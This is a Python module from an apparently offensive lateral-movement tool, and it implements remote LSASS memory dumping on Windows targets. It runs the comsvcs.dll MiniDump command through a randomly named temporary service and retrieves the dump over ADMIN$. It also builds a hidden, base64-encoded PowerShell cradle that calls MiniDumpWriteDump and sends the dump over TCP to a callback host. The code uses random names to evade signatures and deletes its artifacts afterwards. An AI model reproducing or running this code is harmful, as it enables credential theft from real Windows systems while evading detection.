"""Dump methods — different strategies to extract LSASS memory from a remote target.

Each method implements:
1. Remote execution of a technique that captures LSASS memory
2. Retrieval of the dump data (either via SMB file read or TCP receive)
3. Cleanup of any artifacts on the target
"""

import secrets
import string
import time

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl


def random_name(length: int = 8) -> str:
    """Generate a random alphanumeric name for service/file to avoid signatures."""
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


class DumpMethod:
    """Base class for dump methods."""

    name: str = "base"

    def __init__(self, session: SmbSession):
        self.session = session

    def execute(self) -> bytes:
        """Execute the dump and return the raw MDMP bytes."""
        raise NotImplementedError


class ComSvcsDump(DumpMethod):
    """Dump LSASS using comsvcs.dll MiniDumpWriteDump via rundll32.

    This is the simplest and most reliable method. It DOES write a .dmp file
    to disk temporarily, but we retrieve it via SMB and delete it immediately.

    Equivalent to:
        rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <pid> <path> full
    """

    name = "comsvcs"

    def execute(self, lsass_pid: int | None = None) -> bytes:
        dump_name = f"{random_name()}.tmp"
        dump_path = f"C:\\Windows\\Temp\\{dump_name}"
        svc_name = random_name(10)

        # If PID not provided, we need to find lsass.exe PID
        # Use tasklist via service command to find it
        if lsass_pid is None:
            lsass_pid = self._find_lsass_pid(svc_name)

        # Build the command line
        cmd = (
            f"%COMSPEC% /Q /c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
            f"MiniDump {lsass_pid} {dump_path} full"
        )

        # Execute via service creation
        self._exec_via_service(svc_name, cmd)

        # Wait for the dump to be written
        time.sleep(5)

        # Retrieve the dump via SMB (ADMIN$ maps to C:\Windows)
        try:
            dump_data = self.session.read_file("ADMIN$", f"Temp\\{dump_name}")
        except Exception as e:
            raise RuntimeError(f"Failed to read dump file: {e}") from e
        finally:
            # Always clean up
            try:
                self.session.delete_file("ADMIN$", f"Temp\\{dump_name}")
            except Exception:
                pass

        if not dump_data or dump_data[:4] != b"MDMP":
            raise RuntimeError("Retrieved data is not a valid minidump")

        return dump_data

    def _find_lsass_pid(self, svc_name: str) -> int:
        """Find lsass.exe PID by querying the SamSs service (which runs in lsass.exe)."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.open_service("SamSs")
            pid = svc.query_service_pid(svc_handle)
            svc.close_handle(svc_handle)
            return pid

    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
        """Execute a command by creating and starting a temporary service."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()

            # Create and start the service
            svc_handle = svc.create_service(
                service_name=svc_name,
                display_name=svc_name,
                binary_path=cmd,
            )

            try:
                svc.start_service(svc_handle)
            except RuntimeError:
                # Service may fail to start (command exits immediately)
                # That's expected for one-shot commands
                pass

            # Clean up: delete the service
            try:
                svc.delete_service(svc_handle)
            except RuntimeError:
                pass

            svc.close_handle(svc_handle)


class SilentDump(DumpMethod):
    """Stealthier method: uses a custom technique to avoid comsvcs.dll signature.

    Creates a temporary service that uses PowerShell to call MiniDumpWriteDump
    directly via .NET reflection, writing to a named pipe or TCP socket.

    No dump file is written to disk (data goes directly over network).
    """

    name = "silent"

    def execute(self, lsass_pid: int | None = None, listen_port: int = 0) -> bytes:
        from .receiver import DumpReceiver

        svc_name = random_name(10)

        # Start TCP listener
        receiver = DumpReceiver(port=listen_port)
        listen_port = receiver.start()

        # PowerShell cradle that reads LSASS and sends over TCP
        # Uses .NET P/Invoke for MiniDumpWriteDump — no comsvcs.dll involved
        local_ip = self.session._conn.server_name  # Will need adjustment
        ps_script = self._build_ps_cradle(lsass_pid, local_ip, listen_port)

        # Encode as base64 for PowerShell -EncodedCommand
        import base64
        encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded}"

        # Execute
        self._exec_via_service(svc_name, cmd)

        # Wait for data
        dump_data = receiver.wait(timeout=30)

        if not dump_data or dump_data[:4] != b"MDMP":
            raise RuntimeError("Received data is not a valid minidump")

        return dump_data

    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()

            svc_handle = svc.create_service(
                service_name=svc_name,
                display_name=svc_name,
                binary_path=cmd,
            )

            try:
                svc.start_service(svc_handle)
            except RuntimeError:
                pass

            try:
                svc.delete_service(svc_handle)
            except RuntimeError:
                pass

            svc.close_handle(svc_handle)

    def _build_ps_cradle(self, pid: int | None, callback_host: str, port: int) -> str:
        """Build the PowerShell script that dumps LSASS and sends via TCP."""
        return f"""
$c = New-Object System.Net.Sockets.TcpClient("{callback_host}", {port})
$s = $c.GetStream()
$sig = @"
[DllImport("dbghelp.dll", SetLastError=true)]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess, uint ProcessId, IntPtr hFile,
    uint DumpType, IntPtr ExceptionParam,
    IntPtr UserStreamParam, IntPtr CallbackParam);
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
"@
$t = Add-Type -MemberDefinition $sig -Name "DbgHelp" -Namespace "Win32" -PassThru
$lsass = {f'Get-Process lsass | Select-Object -First 1' if pid is None else f'Get-Process -Id {pid}'}
$h = $t::OpenProcess(0x1F0FFF, $false, [uint32]$lsass.Id)
$tmp = [System.IO.Path]::GetTempFileName()
$f = [System.IO.File]::Create($tmp)
$t::MiniDumpWriteDump($h, [uint32]$lsass.Id, $f.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$f.Close()
$bytes = [System.IO.File]::ReadAllBytes($tmp)
$s.Write($bytes, 0, $bytes.Length)
$s.Close()
$c.Close()
Remove-Item $tmp -Force
"""
